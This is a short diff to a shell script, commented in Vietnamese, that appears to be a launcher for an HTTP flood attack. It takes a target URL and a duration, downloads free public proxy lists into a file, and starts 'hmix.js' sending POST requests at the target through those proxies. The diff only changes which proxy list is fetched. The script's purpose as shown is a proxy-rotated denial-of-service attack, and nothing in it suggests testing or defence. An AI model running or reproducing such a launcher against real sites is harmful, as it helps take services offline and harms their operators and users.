@@ -7,8 +7,8 @@ URL=$1
 TIME=$2
 
 # Tải proxy loại HTTP, HTTPS, SOCKS4, SOCKS5 vào live.txt 
-for type in http https socks4 socks5; do
-  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=999999&protocol=${type}"
+for type in http; do
+  curl -s "https://proxyspace.pro/${type}.txt"
 done > live.txt
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
